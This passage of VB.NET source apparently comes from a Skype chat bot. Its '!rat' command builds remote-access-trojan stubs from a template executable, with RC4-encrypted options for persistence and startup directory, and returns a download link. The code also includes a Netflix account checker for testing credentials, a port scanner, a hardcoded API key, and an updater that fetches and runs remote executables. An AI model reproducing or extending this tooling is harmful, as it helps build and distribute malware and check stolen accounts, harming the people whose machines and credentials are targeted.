        Dim json As String = Encoding.UTF8.GetString(w.DownloadData("https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20141215T135708Z.ba81e2e1e88ceb3b.01c0238e50401659ba7225b414ed017ee7f523ab&lang=" & froom & "-" & too & "&text=" & message.Replace(" ", "+")))
        If json.Contains("200") Then
            ' Return json.Replace(My.Settings.prf5, "").Replace(My.Settings.prf4.Replace("[1]", froom).Replace("[2]", too), "")
            Return json.Replace(My.Settings.prf5, "").Replace(Regex.Match(json.Replace(My.Settings.prf5, ""), My.Settings.prf4, RegexOptions.IgnoreCase).Value.ToString, "")
        Else
            Return "Error"
        End If
    End Function
    Function banned(sender As String)
        Dim parts() As String = My.Settings.banlist.Split(New String() {Environment.NewLine},
                                       StringSplitOptions.None)
        For i = 0 To parts.Length - 1
            If parts(i).Contains(sender) Then
                Return True
                GoTo l
            Else

            End If
        Next
        Return False
l:
        Exit Function
    End Function
    Function Rat(arguments As String, sender As String)
        Dim argumentarray() As String = arguments.Split(" ")
        If arguments.StartsWith("build ") Then
            Dim options As String = arguments.Remove(0, 6)
            If arguments.Remove(0, 5).Contains(" -name=") Then
            Else
                Return "No name option, this is required!"
                Exit Function
            End If
            If arguments.Remove(0, 5).Contains(" -key=") Then
            Else
                Return "No key option, this is required!"
                Exit Function
            End If
            Dim optionarray() As String = options.Split(" ")
            For i = 0 To optionarray.Length - 1
                optionarray(i) = optionarray(i).Replace("-", "")
            Next
            Dim all As String = ""
            Dim name As String = ""
            Dim key As String = ""
            For i = 0 To optionarray.Length - 1
                Dim tempoption() As String = optionarray(i).Split("=")
                Dim rOption As String = tempoption(0)
                Dim args As String = ""
                If tempoption.Length = 1 Then
                    args = Nothing
                    GoTo noargs
                End If
                For ii = 1 To tempoption.Length - 1
                    If args = "" Then args = tempoption(1) Else args = args & "=" & tempoption(ii)
                Next
noargs:
                Select Case rOption
                    Case "message"
                        If args = Nothing Then
                            Return "No arguments in message option"
                            Exit Function
                        End If
                    Case "persistance"
                        If args = Nothing Then
                        Else
                            Return "No arguments expected in persistance option"
                        End If
                    Case "name"
                        If args = Nothing Then
                            Return "No arguments in name option"
                            Exit Function
                        End If
                        name = args
                    Case "key"
                        If args = Nothing Then
                            Return "No arguments in name option"
                            Exit Function
                        End If
                        key = args
                    Case "startupdir"
                        args = args.Replace("/", "\")
                        If args = Nothing Then
                            Return "No arguments in name option"
                            Exit Function
                        End If
                        If Not args.EndsWith("\") Then
                            Return "Directory should end with a \ and should be valid."
                            Exit Function
                        End If
                    Case Else
                        Return "Invalid option: " & rOption
                        Exit Function
                End Select
                all = all & " " & rOption & "=" & args
            Next
            Dim stub As String
            Try
                FileOpen(1, Windows.Forms.Application.StartupPath & "\SBRC.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                Randomize()
                Dim rndr As Integer = CInt(Math.Ceiling(Rnd() * 9999)) + 1
                FileClose(1)
                FileOpen(1, Windows.Forms.Application.StartupPath & "\" & name.Replace("%20", " ") & rndr & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                Dim alldata As String = all.Replace(" ", "@sb@")
                FilePut(1, stub & "@sb@" & realbase64(rc4(alldata, key)).ToString & "@sb@" & key & "@sb@" & realbase64(sender).ToString)
                FileClose(1)
                ' My.Computer.Network.UploadFile(Windows.Forms.Application.StartupPath & "\" & name.Replace("%20", " ") & rndr & ".exe", "http://pomfme.com/SHIT/home.php?user=hatsune&pass=miku")
                'IO.File.Delete(Windows.Forms.Application.StartupPath & "\" & name.Replace("%20", " ") & rndr & ".exe")
                Return "http://pomfme.com/SHIT/uploads/" & name.Replace(" ", "%20") & rndr & ".exe"
            Catch ex As Exception
                Return "Error occured, maybe someone else was building a stub or name invalid!" & vbNewLine & "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & sender & vbNewLine & "Cmd: " & "!rat " & arguments & vbNewLine & "Error: " & ex.ToString, "Error!")

            End Try
            Return all
        End If
        If argumentarray(0) = "buildoptions" Then
            Return My.Settings.buildoptions
            Exit Function
        End If
        Return "Invalid option."
    End Function
    Public Shared Function rc4(ByVal message As String, ByVal password As String) As String
        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New StringBuilder
        Dim returnCipher As String = String.Empty
        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim intLength As Integer = password.Length
        Dim a As Integer = 0
        While a <= 255
            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        While a <= message.Length
            Dim itmp As Integer = 0
            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp
            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)
            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)
            itmp = Asc(ctmp)
            Dim cipherby As Integer = itmp Xor k
            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        returnCipher = cipher.ToString
        cipher.Length = 0
        Return returnCipher
    End Function
    Function microsoftip(IP As String)
        Try
            If IP.ToLower.Contains("found") Then
                Return False
                Exit Function
            End If
            IP = IP.Replace("|", "")
            IP = IP.Replace(" ", "")
            Dim w As New WebClient
            w.Proxy = Nothing
            If IP.Contains(":") Then
                Dim parts() As String = IP.Split(":")
                IP = parts(0)
            End If
            Dim mcip As String = w.DownloadString("http://ip-api.com/csv/" & IP)
            Dim qr() As String = mcip.Split(",")
            Dim isp As String = qr(11).Replace("""", "")
            If isp.ToLower.Contains("microsoft") Then
                Return "True" & IP
            Else
                Return "False"
            End If
        Catch
            Return "FalseErr"
        End Try
    End Function
    Shared Function GetMd5Hash(ByVal md5Hash As MD5, ByVal input As String) As String

        ' Convert the input string to a byte array and compute the hash. 
        Dim data As Byte() = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input))

        ' Create a new Stringbuilder to collect the bytes 
        ' and create a string. 
        Dim sBuilder As New StringBuilder()

        ' Loop through each byte of the hashed data  
        ' and format each one as a hexadecimal string. 
        Dim i As Integer
        For i = 0 To data.Length - 1
            sBuilder.Append(data(i).ToString("x2"))
        Next i

        ' Return the hexadecimal string. 
        Return sBuilder.ToString()

    End Function
    Function getmicrosoftip(IP As String)
        IP = IP.Replace("|", "")
        IP = IP.Replace(" ", "")
        If IP.Contains(":") Then
            Dim parts() As String = IP.Split(":")
            IP = parts(0)
        End If
        Dim w As New WebClient
        w.Proxy = Nothing
        Dim mcip As String = w.DownloadString("http://ip-api.com/csv/" & IP)
        Dim qr() As String = mcip.Split(",")
        Dim isp As String = qr(11).Replace("""", "")
        If isp.ToLower.Contains("microsoft") Then
            Return IP
        Else
            Return "False"
        End If
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Settings.banlist = My.Settings.banlist & vbNewLine & TextBox1.Text
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        My.Settings.banlist = My.Settings.banlist.Replace(vbNewLine & TextBox1.Text, "").Replace(TextBox1.Text, "")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        My.Settings.helpmsg = TextBox2.Text
    End Sub
    Public Function GetExternalIp() As String
        Try
            Dim ExternalIP As String
            Dim w As New WebClient
            w.Proxy = Nothing
            ExternalIP = w.DownloadString("http://apis.skypebot.ga/apis/getip.php")
            Return ExternalIP
        Catch
            Return Nothing
        End Try
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        MsgBox(My.Settings.banlist)
    End Sub

    Private Sub FRReceived(pUser As User)
        If FlatToggle1.Checked = True Then
            pUser.IsAuthorized = True
            Skypattach.SendMessage(pUser.Handle, "Welcome! Type " & trigger & "help to get started!")
        End If
    End Sub
    Private Sub dz(pUser As User)
        MsgBox("qdf")
        If FlatToggle1.Checked = True Then
            pUser.IsAuthorized = True
            Skypattach.SendMessage(pUser.Handle, "Welcome! Type " & trigger & "help to get started!")
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        MsgBox("Enter in the textbox below who you want to let use your bot, to let someone not use your bot use the ban thing above." & vbNewLine & vbNewLine & "If you want everyone to use your bot, put %everyone% at the start, If you want specific people, then just type their name line by line.")
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
        My.Settings.whitelistlist = TextBox3.Text
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Dim w As New WebClient
        w.Proxy = Nothing
        Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
        If latest = version Then
            Changelog.Show()
        Else
            MsgBox("You are not on the latest version, please update...")
        End If
    End Sub
    Function portscan(ip As String)
        Dim w As New WebClient
        w.Proxy = Nothing
        Return w.DownloadString("http://api.abrasivecraft.com/?tool=portscanner&ip=" & ip)
    End Function
    Function StripTags(ByVal html As String) As String
        ' Remove HTML tags.
        Return Regex.Replace(html, "<.*?>", "")
    End Function
    Function isportopen(ip As String, port As String)
        Dim Client As TcpClient = Nothing
        Try
            Client = New TcpClient(ip, port)
            Return True
        Catch ex As SocketException
            Return False
        Finally
            If Not Client Is Nothing Then
                Client.Close()
            End If
        End Try
    End Function


    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        UpdateMe(1)
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Dim w As New WebClient
        w.Proxy = Nothing
        w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
        w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
        Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
        System.Windows.Forms.Application.Exit()
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        MsgBox("Add lesleydk@hotmail.com on skype and give me your problem :)")
    End Sub
    Private Sub Button12_Click(sender As Object, e As EventArgs)
        My.Settings.admins = TextBox4.Text
    End Sub
    Private Sub Button14_Click(sender As Object, e As EventArgs)
        My.Settings.Ultimate = TextBox6.Text
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs)
        My.Settings.Premium = TextBox5.Text
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        My.Settings.whitelist = TextBox7.Text
    End Sub


    Private Sub FlatToggle2_CheckedChanged(sender As Object) Handles FlatToggle2.CheckedChanged
        If FlatToggle2.Checked = True Then
            My.Settings.prult = 1
        ElseIf FlatToggle2.Checked = False Then
            My.Settings.prult = 0
        End If
    End Sub


    Private Sub ShowHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowHideToolStripMenuItem1.Click
        If WindowState = FormWindowState.Minimized Then
            Show()
            Activate()
            WindowState = FormWindowState.Normal
        Else
            Hide()
            WindowState = FormWindowState.Minimized
        End If
    End Sub
    Sub l() Handles MyBase.Load
        For Fadein = 0.0 To 1.1 Step 0.1
            Me.Opacity = Fadein
            Me.Refresh()
            Threading.Thread.Sleep(50)
        Next
        Show()
    End Sub
    Private Sub ExitToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem1.Click
        Windows.Forms.Application.Exit()
    End Sub

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        My.Settings.Save()
        Hide()
        WindowState = FormWindowState.Minimized
    End Sub

    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
        Dim w As New WebClient
        w.Proxy = Nothing
        w.DownloadString("http://apis.skypebot.ga/apis/submit.php?idea=" & FlatTextBox2.Text & "&skp=" & FlatTextBox1.Text & "&auth=True")
        MsgBox("We will maybe contact you later, thanks!")
    End Sub
    Function POST(api As String, content As String)
        Dim w As New WebClient
        w.Proxy = Nothing
        w.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded")
        Dim r As String = w.UploadString(api, content)
        Return r
    End Function
    Function paste(content As String, Optional title As String = "Untitled")
        Try
            Dim w As New WebClient
            w.Proxy = Nothing
            Dim request As WebRequest = WebRequest.Create("http://skypepaste.ga/pages/api.php")
            request.Method = "POST"
            Dim postData As String = "text=" & encrypt(content) & "&title=" & title
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
            Return responseFromServer
        Catch ex As Exception
            Return paste2(content)
        End Try
    End Function
    Function dice()
l:
        Randomize()
        Dim t = Int(Rnd() * 7)
        If t = 7 Then GoTo l
        If t = 0 Then GoTo l
        Return t
    End Function
    Function encrypt(t As String)
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(t)).Replace("+", "-").Replace("/", "_")
    End Function
    Function decrypt(t As String)
        t = t.Replace("-", "+").Replace("_", "/")
        Return Encoding.UTF8.GetString(Convert.FromBase64String(t))
    End Function
    Function paste2(content As String)
        Dim POST As String = "content=" & content & "&lexer=text&ttl=31536000&key="

        Dim req As HttpWebRequest = DirectCast(HttpWebRequest.Create("https://pastee.org/submit"), HttpWebRequest)
        req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36"
        req.AllowAutoRedirect = True
        req.ContentType = "application/x-www-form-urlencoded"
        req.ContentLength = POST.Length
        req.Method = "POST"
        req.KeepAlive = True
        Dim requestStream As Stream = req.GetRequestStream()
        Dim postBytes As Byte() = Encoding.ASCII.GetBytes(POST)
        requestStream.Write(postBytes, 0, postBytes.Length)
        requestStream.Close()
        Dim Res As HttpWebResponse = req.GetResponse()
        Dim response As HttpWebResponse
        Dim resUri As String
        response = req.GetResponse
        resUri = response.ResponseUri.AbsoluteUri
        Return resUri.Replace("/preview", "")
    End Function
    Sub fdsqf() Handles MyBase.Shown
        TopMost = False
    End Sub

    Private Sub CheckBox6c(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            adminst = 1
        Else
            adminst = 0
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            swag = 1
        Else
            swag = 0
        End If
    End Sub
    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
        My.Application.SaveMySettingsOnExit = True
        My.Settings.Save()
        Windows.Forms.Application.ExitThread()
    End Sub
    Function Nfcheck(user As String, pass As String) As String
        Try
            Dim checkers As New NetflixChecker
            Dim res As String = checkers.AccountValid(user, pass)
            If res Then
                Return "1"
            Else
                Return "0"
            End If
        Catch
            Return "err"
        End Try
    End Function
    Function IsIpValid(strIPAddress As String) As Boolean
        Return System.Net.IPAddress.TryParse(strIPAddress, Nothing)
    End Function
    Function base64fenc(data As String)
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(data))
    End Function
    Function realbase64(dataz As String)
        Return base64fenc(base64fenc(base64fenc(dataz)))
    End Function
    Function Crawl(Page As String)
        Dim w As New WebClient
        w.Proxy = Nothing
        Return w.DownloadString("http://api.hackertarget.com/pagelinks/?q=" & Page).Replace(" ", "%20").Replace("  ", "%20%20")
    End Function

    Private Sub TextBox7_TextChanged(sender As Object, e As EventArgs) Handles TextBox7.TextChanged
        If splsh.startup = "0" Then Exit Sub
        My.Settings.whitelist = TextBox7.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox4_TextChanged(sender As Object, e As EventArgs) Handles TextBox4.TextChanged
        If splsh.startup = "0" Then Exit Sub
        My.Settings.admins = TextBox4.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox6_TextChanged(sender As Object, e As EventArgs) Handles TextBox6.TextChanged
        If splsh.startup = "0" Then Exit Sub
        My.Settings.Ultimate = TextBox6.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged
        If splsh.startup = "0" Then Exit Sub
        My.Settings.Premium = TextBox5.Text
        My.Settings.Save()
    End Sub

    Private Sub FlatButton4_Click(sender As Object, e As EventArgs) Handles FlatButton4.Click
        Dim w As New WebClient
        w.Proxy = Nothing
        MsgBox(w.DownloadString("https://www.dropbox.com/s/w0nv1t0eu6xqm8l/EULA.txt?dl=1"))
    End Sub
End Class